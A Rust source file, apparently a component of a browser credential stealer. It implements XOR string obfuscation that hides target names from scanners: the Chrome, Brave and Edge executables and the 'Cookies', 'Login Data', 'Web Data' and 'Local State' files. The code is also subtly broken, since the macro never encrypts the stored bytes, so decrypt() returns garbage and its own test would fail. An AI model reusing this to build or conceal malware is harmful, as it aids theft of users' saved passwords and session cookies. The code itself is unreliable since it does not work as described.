// 字符串混淆模块 - 编译时加密
use std::sync::LazyLock;

/// 编译时字符串混淆
pub struct ObfuscatedString {
    data: &'static [u8],
    key: u8,
}

impl ObfuscatedString {
    pub const fn new(data: &'static [u8], key: u8) -> Self {
        Self { data, key }
    }

    pub fn decrypt(&self) -> String {
        self.data
            .iter()
            .enumerate()
            .map(|(i, &b)| (b ^ self.key ^ (i as u8)) as char)
            .collect()
    }

    pub fn decrypt_wide(&self) -> Vec<u16> {
        self.decrypt().encode_utf16().collect()
    }
}

/// 宏：编译时加密字符串
#[macro_export]
macro_rules! obf_str {
    ($s:expr) => {{
        const DATA: &[u8] = $s.as_bytes();
        const KEY: u8 = 0xAA;
        static OBF: $crate::obfuscation::ObfuscatedString =
            $crate::obfuscation::ObfuscatedString::new(DATA, KEY);
        OBF.decrypt()
    }};
}

/// 宽字符串版本
#[macro_export]
macro_rules! obf_wstr {
    ($s:expr) => {{
        const DATA: &[u8] = $s.as_bytes();
        const KEY: u8 = 0xAA;
        static OBF: $crate::obfuscation::ObfuscatedString =
            $crate::obfuscation::ObfuscatedString::new(DATA, KEY);
        OBF.decrypt_wide()
    }};
}

/// 栈字符串 - 使用后自动清零
pub struct StackString {
    data: Vec<u8>,
}

impl StackString {
    pub fn new(s: String) -> Self {
        Self {
            data: s.into_bytes(),
        }
    }

    pub fn as_ptr(&self) -> *const u8 {
        self.data.as_ptr()
    }

    pub fn as_str(&self) -> &str {
        std::str::from_utf8(&self.data).unwrap_or("")
    }
}

impl Drop for StackString {
    fn drop(&mut self) {
        // 安全清零内存
        for byte in &mut self.data {
            unsafe { std::ptr::write_volatile(byte, 0) };
        }
    }
}

// 预定义混淆字符串
pub static CHROME_EXE: LazyLock<String> = LazyLock::new(|| obf_str!("chrome.exe"));
pub static BRAVE_EXE: LazyLock<String> = LazyLock::new(|| obf_str!("brave.exe"));
pub static MSEDGE_EXE: LazyLock<String> = LazyLock::new(|| obf_str!("msedge.exe"));
pub static LOCAL_STATE: LazyLock<String> = LazyLock::new(|| obf_str!("Local State"));
pub static USER_DATA: LazyLock<String> = LazyLock::new(|| obf_str!("User Data"));
pub static COOKIES_DB: LazyLock<String> = LazyLock::new(|| obf_str!("Cookies"));
pub static LOGIN_DATA_DB: LazyLock<String> = LazyLock::new(|| obf_str!("Login Data"));
pub static WEB_DATA_DB: LazyLock<String> = LazyLock::new(|| obf_str!("Web Data"));

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_string_obfuscation() {
        let s = obf_str!("test");
        assert_eq!(s, "test");
    }

    #[test]
    fn test_stack_string_cleanup() {
        let s = StackString::new("secret".to_string());
        assert_eq!(s.as_str(), "secret");
        // Drop 会自动清零
    }
}
